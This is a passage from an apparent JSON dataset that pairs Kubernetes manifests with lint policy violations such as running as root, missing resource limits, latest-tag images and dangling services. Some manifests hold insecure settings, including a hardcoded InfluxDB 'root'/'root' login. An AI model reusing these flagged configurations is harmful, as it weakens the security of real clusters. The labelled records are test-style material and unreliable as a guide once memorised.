    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: csi-secrets-store-windows\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-secrets-store\n  template:\n    metadata:\n      labels:\n        app: csi-secrets-store\n      annotations:\n        kubectl.kubernetes.io/default-container: secrets-store\n    spec:\n      serviceAccountName: secrets-store-csi-driver\n      containers:\n      - name: node-driver-registrar\n        image: k8s.gcr.io/sig-storage/csi-node-driver-registrar:v2.4.0\n        args:\n        - --v=5\n        - --csi-address=unix://C:\\csi\\csi.sock\n        - --kubelet-registration-path=C:\\var\\lib\\kubelet\\plugins\\csi-secrets-store\\csi.sock\n        livenessProbe:\n          exec:\n            command:\n            - /csi-node-driver-registrar.exe\n            - --kubelet-registration-path=C:\\var\\lib\\kubelet\\plugins\\csi-secrets-store\\csi.sock\n            - --mode=kubelet-registration-probe\n          initialDelaySeconds: 30\n          timeoutSeconds: 15\n        env:\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: C:\\csi\n        - name: registration-dir\n          mountPath: C:\\registration\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n      - name: secrets-store\n        image: k8s.gcr.io/csi-secrets-store/driver:v1.0.0\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --nodeid=$(KUBE_NODE_NAME)\n        - --provider-volume=C:\\k\\secrets-store-csi-providers\n        - --metrics-addr=:8095\n        - --enable-secret-rotation=false\n        - --rotation-poll-interval=2m\n        - --provider-health-check=false\n        - --provider-health-check-interval=2m\n        env:\n        - name: CSI_ENDPOINT\n          value: unix://C:\\\\csi\\\\csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9808\n          name: healthz\n          protocol: TCP\n        - containerPort: 8095\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 15\n        resources:\n          limits:\n            cpu: 400m\n            memory: 400Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: C:\\csi\n        - name: mountpoint-dir\n          mountPath: C:\\var\\lib\\kubelet\\pods\n        - name: providers-dir\n          mountPath: C:\\k\\secrets-store-csi-providers\n      - name: liveness-probe\n        image: k8s.gcr.io/sig-storage/livenessprobe:v2.5.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=unix://C:\\csi\\csi.sock\n        - --probe-timeout=3s\n        - --http-endpoint=0.0.0.0:9808\n        - -v=2\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: C:\\csi\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n      volumes:\n      - name: mountpoint-dir\n        hostPath:\n          path: C:\\var\\lib\\kubelet\\pods\\\n          type: DirectoryOrCreate\n      - name: registration-dir\n        hostPath:\n          path: C:\\var\\lib\\kubelet\\plugins_registry\\\n          type: Directory\n      - name: plugin-dir\n        hostPath:\n          path: C:\\var\\lib\\kubelet\\plugins\\csi-secrets-store\\\n          type: DirectoryOrCreate\n      - name: providers-dir\n        hostPath:\n          path: C:\\k\\secrets-store-csi-providers\\\n          type: DirectoryOrCreate\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"secrets-store\" is not set to runAsNonRoot"
  },
  {
    "id": "1772",
    "manifest_path": "data/manifests/the_stack_sample/sample_0364.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: divman-7f1d\n  labels:\n    app: divman-7f1d\nspec:\n  type: LoadBalancer\n  ports:\n  - port: 8080\n    targetPort: 8080\n    protocol: TCP\n    name: http\n  selector:\n    app: divman-7f1d\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:divman-7f1d])"
  },
  {
    "id": "1773",
    "manifest_path": "data/manifests/the_stack_sample/sample_0365.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app: redis-sentinel-slave-ss\n  name: redis-sentinel-slave-ss\n  namespace: default\nspec:\n  clusterIP: None\n  ports:\n  - name: redis\n    port: 6379\n    targetPort: 6379\n  selector:\n    app: redis-sentinel-slave-ss\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:redis-sentinel-slave-ss])"
  },
  {
    "id": "1774",
    "manifest_path": "data/manifests/the_stack_sample/sample_0367.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: wp-http\n  namespace: frontend\nspec:\n  type: NodePort\n  selector:\n    app: wp\n  ports:\n  - protocol: TCP\n    port: 80\n    targetPort: 80\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:wp])"
  },
  {
    "id": "1775",
    "manifest_path": "data/manifests/the_stack_sample/sample_0369.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: openmcp-analytic-engine\n  namespace: openmcp\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: openmcp-analytic-engine\n  template:\n    metadata:\n      labels:\n        name: openmcp-analytic-engine\n    spec:\n      serviceAccountName: openmcp-analytic-engine\n      containers:\n      - name: openmcp-analytic-engine\n        image: REPLACE_DOCKER_REPO_NAME/openmcp-analytic-engine:v0.0.1\n        command:\n        - openmcp-analytic-engine\n        imagePullPolicy: REPLACE_DOCKERIMAGEPULLPOLICY\n        env:\n        - name: WATCH_NAMESPACE\n          value: ''\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: INFLUX_IP\n          value: REPLACE_INFLUXDBIP\n        - name: INFLUX_PORT\n          value: REPLACE_INFLUXDBPORT\n        - name: INFLUX_USERNAME\n          value: root\n        - name: INFLUX_PASSWORD\n          value: root\n        - name: OPERATOR_NAME\n          value: openmcp-analytic-engine\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"openmcp-analytic-engine\" does not have a read-only root file system"
  },
  {
    "id": "1776",
    "manifest_path": "data/manifests/the_stack_sample/sample_0369.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: openmcp-analytic-engine\n  namespace: openmcp\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: openmcp-analytic-engine\n  template:\n    metadata:\n      labels:\n        name: openmcp-analytic-engine\n    spec:\n      serviceAccountName: openmcp-analytic-engine\n      containers:\n      - name: openmcp-analytic-engine\n        image: REPLACE_DOCKER_REPO_NAME/openmcp-analytic-engine:v0.0.1\n        command:\n        - openmcp-analytic-engine\n        imagePullPolicy: REPLACE_DOCKERIMAGEPULLPOLICY\n        env:\n        - name: WATCH_NAMESPACE\n          value: ''\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: INFLUX_IP\n          value: REPLACE_INFLUXDBIP\n        - name: INFLUX_PORT\n          value: REPLACE_INFLUXDBPORT\n        - name: INFLUX_USERNAME\n          value: root\n        - name: INFLUX_PASSWORD\n          value: root\n        - name: OPERATOR_NAME\n          value: openmcp-analytic-engine\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"openmcp-analytic-engine\" not found"
  },
  {
    "id": "1777",
    "manifest_path": "data/manifests/the_stack_sample/sample_0369.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: openmcp-analytic-engine\n  namespace: openmcp\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: openmcp-analytic-engine\n  template:\n    metadata:\n      labels:\n        name: openmcp-analytic-engine\n    spec:\n      serviceAccountName: openmcp-analytic-engine\n      containers:\n      - name: openmcp-analytic-engine\n        image: REPLACE_DOCKER_REPO_NAME/openmcp-analytic-engine:v0.0.1\n        command:\n        - openmcp-analytic-engine\n        imagePullPolicy: REPLACE_DOCKERIMAGEPULLPOLICY\n        env:\n        - name: WATCH_NAMESPACE\n          value: ''\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: INFLUX_IP\n          value: REPLACE_INFLUXDBIP\n        - name: INFLUX_PORT\n          value: REPLACE_INFLUXDBPORT\n        - name: INFLUX_USERNAME\n          value: root\n        - name: INFLUX_PASSWORD\n          value: root\n        - name: OPERATOR_NAME\n          value: openmcp-analytic-engine\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"openmcp-analytic-engine\" is not set to runAsNonRoot"
  },
  {
    "id": "1778",
    "manifest_path": "data/manifests/the_stack_sample/sample_0369.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: openmcp-analytic-engine\n  namespace: openmcp\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: openmcp-analytic-engine\n  template:\n    metadata:\n      labels:\n        name: openmcp-analytic-engine\n    spec:\n      serviceAccountName: openmcp-analytic-engine\n      containers:\n      - name: openmcp-analytic-engine\n        image: REPLACE_DOCKER_REPO_NAME/openmcp-analytic-engine:v0.0.1\n        command:\n        - openmcp-analytic-engine\n        imagePullPolicy: REPLACE_DOCKERIMAGEPULLPOLICY\n        env:\n        - name: WATCH_NAMESPACE\n          value: ''\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: INFLUX_IP\n          value: REPLACE_INFLUXDBIP\n        - name: INFLUX_PORT\n          value: REPLACE_INFLUXDBPORT\n        - name: INFLUX_USERNAME\n          value: root\n        - name: INFLUX_PASSWORD\n          value: root\n        - name: OPERATOR_NAME\n          value: openmcp-analytic-engine\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"openmcp-analytic-engine\" has cpu request 0"
  },
  {
    "id": "1779",
    "manifest_path": "data/manifests/the_stack_sample/sample_0369.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: openmcp-analytic-engine\n  namespace: openmcp\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: openmcp-analytic-engine\n  template:\n    metadata:\n      labels:\n        name: openmcp-analytic-engine\n    spec:\n      serviceAccountName: openmcp-analytic-engine\n      containers:\n      - name: openmcp-analytic-engine\n        image: REPLACE_DOCKER_REPO_NAME/openmcp-analytic-engine:v0.0.1\n        command:\n        - openmcp-analytic-engine\n        imagePullPolicy: REPLACE_DOCKERIMAGEPULLPOLICY\n        env:\n        - name: WATCH_NAMESPACE\n          value: ''\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: INFLUX_IP\n          value: REPLACE_INFLUXDBIP\n        - name: INFLUX_PORT\n          value: REPLACE_INFLUXDBPORT\n        - name: INFLUX_USERNAME\n          value: root\n        - name: INFLUX_PASSWORD\n          value: root\n        - name: OPERATOR_NAME\n          value: openmcp-analytic-engine\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"openmcp-analytic-engine\" has memory limit 0"
  },
  {
    "id": "1780",
    "manifest_path": "data/manifests/the_stack_sample/sample_0372.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    control-plane: controller-manager\n  name: special-resource-controller-manager\n  namespace: openshift-special-resource-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      control-plane: controller-manager\n  template:\n    metadata:\n      labels:\n        control-plane: controller-manager\n    spec:\n      containers:\n      - args:\n        - --secure-listen-address=0.0.0.0:8443\n        - --upstream=http://127.0.0.1:8080/\n        - --logtostderr=true\n        - --v=10\n        - --tls-cert-file=/etc/secrets/tls.crt\n        - --tls-private-key-file=/etc/secrets/tls.key\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_RSA_WITH_AES_128_CBC_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256,TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256\n        image: registry.redhat.io/openshift4/ose-kube-rbac-proxy\n        name: kube-rbac-proxy\n        ports:\n        - containerPort: 8443\n          name: https\n        resources:\n          limits:\n            cpu: 500m\n            memory: 128Mi\n          requests:\n            cpu: 250m\n            memory: 64Mi\n        securityContext:\n          readOnlyRootFilesystem: true\n        volumeMounts:\n        - mountPath: /etc/secrets\n          name: special-resource-operator-tls\n      - args:\n        - --metrics-addr=127.0.0.1:8080\n        - --enable-leader-election\n        command:\n        - /manager\n        env:\n        - name: OPERATOR_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: RELEASE_VERSION\n          value: 0.0.1-snapshot\n        - name: SSL_CERT_DIR\n          value: /etc/pki/tls/certs\n        image: quay.io/openshift-psap/special-resource-operator:chart-as-asset\n        imagePullPolicy: Always\n        name: manager\n        resources:\n          limits:\n            cpu: 300m\n            memory: 500Mi\n          requests:\n            cpu: 300m\n            memory: 500Mi\n        securityContext:\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        volumeMounts:\n        - mountPath: /cache\n          name: cache-volume\n      securityContext:\n        runAsGroup: 499\n        runAsNonRoot: true\n        runAsUser: 499\n      volumes:\n      - name: special-resource-operator-tls\n        secret:\n          secretName: special-resource-operator-tls\n      - emptyDir: {}\n        name: cache-volume\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"kube-rbac-proxy\" is using an invalid container image, \"registry.redhat.io/openshift4/ose-kube-rbac-proxy\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "1781",
    "manifest_path": "data/manifests/the_stack_sample/sample_0373.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\n  annotations:\n    fluxcd.io/automated: 'true'\n    fluxcd.io/tag.init: regex:^3.10.*\n    fluxcd.io/tag.podinfod: semver:~3.1\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9797'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.10\n        command:\n        - sleep\n        - '1'\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:3.1.5\n        imagePullPolicy: IfNotPresent\n        ports:\n        - name: http\n          containerPort: 9898\n          protocol: TCP\n        - name: http-metrics\n          containerPort: 9797\n          protocol: TCP\n        - name: grpc\n          containerPort: 9999\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --port-metrics=9797\n        - --grpc-port=9999\n        - --grpc-service-name=podinfo\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        env:\n        - name: PODINFO_UI_COLOR\n          value: '#34577c'\n        - name: PODINFO_UI_MESSAGE\n          value: Hello from the pod\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"init\" does not have a read-only root file system"
  },
  {
    "id": "1782",
    "manifest_path": "data/manifests/the_stack_sample/sample_0373.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\n  annotations:\n    fluxcd.io/automated: 'true'\n    fluxcd.io/tag.init: regex:^3.10.*\n    fluxcd.io/tag.podinfod: semver:~3.1\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9797'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.10\n        command:\n        - sleep\n        - '1'\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:3.1.5\n        imagePullPolicy: IfNotPresent\n        ports:\n        - name: http\n          containerPort: 9898\n          protocol: TCP\n        - name: http-metrics\n          containerPort: 9797\n          protocol: TCP\n        - name: grpc\n          containerPort: 9999\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --port-metrics=9797\n        - --grpc-port=9999\n        - --grpc-service-name=podinfo\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        env:\n        - name: PODINFO_UI_COLOR\n          value: '#34577c'\n        - name: PODINFO_UI_MESSAGE\n          value: Hello from the pod\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"podinfod\" does not have a read-only root file system"
  },
  {
    "id": "1783",
    "manifest_path": "data/manifests/the_stack_sample/sample_0373.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\n  annotations:\n    fluxcd.io/automated: 'true'\n    fluxcd.io/tag.init: regex:^3.10.*\n    fluxcd.io/tag.podinfod: semver:~3.1\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9797'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.10\n        command:\n        - sleep\n        - '1'\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:3.1.5\n        imagePullPolicy: IfNotPresent\n        ports:\n        - name: http\n          containerPort: 9898\n          protocol: TCP\n        - name: http-metrics\n          containerPort: 9797\n          protocol: TCP\n        - name: grpc\n          containerPort: 9999\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --port-metrics=9797\n        - --grpc-port=9999\n        - --grpc-service-name=podinfo\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        env:\n        - name: PODINFO_UI_COLOR\n          value: '#34577c'\n        - name: PODINFO_UI_MESSAGE\n          value: Hello from the pod\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"init\" is not set to runAsNonRoot"
  },
  {
    "id": "1784",
    "manifest_path": "data/manifests/the_stack_sample/sample_0373.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\n  annotations:\n    fluxcd.io/automated: 'true'\n    fluxcd.io/tag.init: regex:^3.10.*\n    fluxcd.io/tag.podinfod: semver:~3.1\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9797'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.10\n        command:\n        - sleep\n        - '1'\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:3.1.5\n        imagePullPolicy: IfNotPresent\n        ports:\n        - name: http\n          containerPort: 9898\n          protocol: TCP\n        - name: http-metrics\n          containerPort: 9797\n          protocol: TCP\n        - name: grpc\n          containerPort: 9999\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --port-metrics=9797\n        - --grpc-port=9999\n        - --grpc-service-name=podinfo\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        env:\n        - name: PODINFO_UI_COLOR\n          value: '#34577c'\n        - name: PODINFO_UI_MESSAGE\n          value: Hello from the pod\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"podinfod\" is not set to runAsNonRoot"
  },
  {
    "id": "1785",
    "manifest_path": "data/manifests/the_stack_sample/sample_0373.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\n  annotations:\n    fluxcd.io/automated: 'true'\n    fluxcd.io/tag.init: regex:^3.10.*\n    fluxcd.io/tag.podinfod: semver:~3.1\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9797'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.10\n        command:\n        - sleep\n        - '1'\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:3.1.5\n        imagePullPolicy: IfNotPresent\n        ports:\n        - name: http\n          containerPort: 9898\n          protocol: TCP\n        - name: http-metrics\n          containerPort: 9797\n          protocol: TCP\n        - name: grpc\n          containerPort: 9999\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --port-metrics=9797\n        - --grpc-port=9999\n        - --grpc-service-name=podinfo\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        env:\n        - name: PODINFO_UI_COLOR\n          value: '#34577c'\n        - name: PODINFO_UI_MESSAGE\n          value: Hello from the pod\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"init\" has cpu request 0"
  },
  {
    "id": "1786",
    "manifest_path": "data/manifests/the_stack_sample/sample_0373.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\n  annotations:\n    fluxcd.io/automated: 'true'\n    fluxcd.io/tag.init: regex:^3.10.*\n    fluxcd.io/tag.podinfod: semver:~3.1\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9797'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.10\n        command:\n        - sleep\n        - '1'\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:3.1.5\n        imagePullPolicy: IfNotPresent\n        ports:\n        - name: http\n          containerPort: 9898\n          protocol: TCP\n        - name: http-metrics\n          containerPort: 9797\n          protocol: TCP\n        - name: grpc\n          containerPort: 9999\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --port-metrics=9797\n        - --grpc-port=9999\n        - --grpc-service-name=podinfo\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        env:\n        - name: PODINFO_UI_COLOR\n          value: '#34577c'\n        - name: PODINFO_UI_MESSAGE\n          value: Hello from the pod\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"init\" has memory limit 0"
  },
  {
    "id": "1787",
    "manifest_path": "data/manifests/the_stack_sample/sample_0374.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: loadgenerator\nspec:\n  selector:\n    matchLabels:\n      app: loadgenerator\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: loadgenerator\n      annotations:\n        sidecar.istio.io/rewriteAppHTTPProbers: 'true'\n    spec:\n      serviceAccountName: default\n      initContainers:\n      - command:\n        - /bin/sh\n        - -exc\n        - \"echo \\\"Init container pinging frontend: ${FRONTEND_ADDR}...\\\"\\nSTATUSCODE=$(wget\\\n          \\ --server-response http://${FRONTEND_ADDR} 2>&1 | awk '/^  HTTP/{print\\\n          \\ $2}')\\nif test $STATUSCODE -ne 200; then\\n    echo \\\"Error: Could not\\\n          \\ reach frontend - Status code: ${STATUSCODE}\\\"\\n    exit 1\\nfi\\n\"\n        name: frontend-check\n        image: busybox:latest\n        securityContext:\n          runAsUser: 65534\n          runAsGroup: 65534\n        env:\n        - name: FRONTEND_ADDR\n          value: frontend:80\n      containers:\n      - name: main\n        image: loadgenerator\n        env:\n        - name: FRONTEND_ADDR\n          value: frontend:80\n        - name: USERS\n          value: '10'\n        resources:\n          requests:\n            cpu: 300m\n            memory: 256Mi\n          limits:\n            cpu: 500m\n            memory: 512Mi\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"frontend-check\" is using an invalid container image, \"busybox:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "1788",
    "manifest_path": "data/manifests/the_stack_sample/sample_0374.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: loadgenerator\nspec:\n  selector:\n    matchLabels:\n      app: loadgenerator\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: loadgenerator\n      annotations:\n        sidecar.istio.io/rewriteAppHTTPProbers: 'true'\n    spec:\n      serviceAccountName: default\n      initContainers:\n      - command:\n        - /bin/sh\n        - -exc\n        - \"echo \\\"Init container pinging frontend: ${FRONTEND_ADDR}...\\\"\\nSTATUSCODE=$(wget\\\n          \\ --server-response http://${FRONTEND_ADDR} 2>&1 | awk '/^  HTTP/{print\\\n          \\ $2}')\\nif test $STATUSCODE -ne 200; then\\n    echo \\\"Error: Could not\\\n          \\ reach frontend - Status code: ${STATUSCODE}\\\"\\n    exit 1\\nfi\\n\"\n        name: frontend-check\n        image: busybox:latest\n        securityContext:\n          runAsUser: 65534\n          runAsGroup: 65534\n        env:\n        - name: FRONTEND_ADDR\n          value: frontend:80\n      containers:\n      - name: main\n        image: loadgenerator\n        env:\n        - name: FRONTEND_ADDR\n          value: frontend:80\n        - name: USERS\n          value: '10'\n        resources:\n          requests:\n            cpu: 300m\n            memory: 256Mi\n          limits:\n            cpu: 500m\n            memory: 512Mi\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"main\" is using an invalid container image, \"loadgenerator\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "1789",
    "manifest_path": "data/manifests/the_stack_sample/sample_0374.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: loadgenerator\nspec:\n  selector:\n    matchLabels:\n      app: loadgenerator\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: loadgenerator\n      annotations:\n        sidecar.istio.io/rewriteAppHTTPProbers: 'true'\n    spec:\n      serviceAccountName: default\n      initContainers:\n      - command:\n        - /bin/sh\n        - -exc\n        - \"echo \\\"Init container pinging frontend: ${FRONTEND_ADDR}...\\\"\\nSTATUSCODE=$(wget\\\n          \\ --server-response http://${FRONTEND_ADDR} 2>&1 | awk '/^  HTTP/{print\\\n          \\ $2}')\\nif test $STATUSCODE -ne 200; then\\n    echo \\\"Error: Could not\\\n          \\ reach frontend - Status code: ${STATUSCODE}\\\"\\n    exit 1\\nfi\\n\"\n        name: frontend-check\n        image: busybox:latest\n        securityContext:\n          runAsUser: 65534\n          runAsGroup: 65534\n        env:\n        - name: FRONTEND_ADDR\n          value: frontend:80\n      containers:\n      - name: main\n        image: loadgenerator\n        env:\n        - name: FRONTEND_ADDR\n          value: frontend:80\n        - name: USERS\n          value: '10'\n        resources:\n          requests:\n            cpu: 300m\n            memory: 256Mi\n          limits:\n            cpu: 500m\n            memory: 512Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"frontend-check\" does not have a read-only root file system"
  },
  {
    "id": "1790",
    "manifest_path": "data/manifests/the_stack_sample/sample_0374.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: loadgenerator\nspec:\n  selector:\n    matchLabels:\n      app: loadgenerator\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: loadgenerator\n      annotations:\n        sidecar.istio.io/rewriteAppHTTPProbers: 'true'\n    spec:\n      serviceAccountName: default\n      initContainers:\n      - command:\n        - /bin/sh\n        - -exc\n        - \"echo \\\"Init container pinging frontend: ${FRONTEND_ADDR}...\\\"\\nSTATUSCODE=$(wget\\\n          \\ --server-response http://${FRONTEND_ADDR} 2>&1 | awk '/^  HTTP/{print\\\n          \\ $2}')\\nif test $STATUSCODE -ne 200; then\\n    echo \\\"Error: Could not\\\n          \\ reach frontend - Status code: ${STATUSCODE}\\\"\\n    exit 1\\nfi\\n\"\n        name: frontend-check\n        image: busybox:latest\n        securityContext:\n          runAsUser: 65534\n          runAsGroup: 65534\n        env:\n        - name: FRONTEND_ADDR\n          value: frontend:80\n      containers:\n      - name: main\n        image: loadgenerator\n        